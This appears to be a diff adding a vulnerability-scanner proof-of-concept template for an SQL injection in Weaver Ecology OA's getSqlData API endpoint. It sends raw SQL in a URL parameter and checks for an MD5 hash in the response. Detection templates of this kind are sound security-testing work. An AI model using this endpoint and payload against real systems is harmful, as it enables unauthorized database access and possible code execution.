@@ -1,0 +1,23 @@
+name: poc-yaml-weaver-ecology-getsqldata-sqli-rce
+binding: 2ad586e2-c110-44f6-b5b4-f28b74ba1800
+manual: true
+detail:
+    author: xiaoguaiii
+    links:
+        - https://github.com/Wrin9/weaverOA_sql_RCE/blob/main/weaverOA_sql_injection_POC_EXP.py
+    vulnerability:
+        id: CT-442574
+        level: high
+transport: http
+set:
+    rand: randomInt(1, 50000)
+rules:
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes('MD5','{{rand}}')),3,32)
+            follow_redirects: false
+        expression: |
+            response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
+expression: r1()
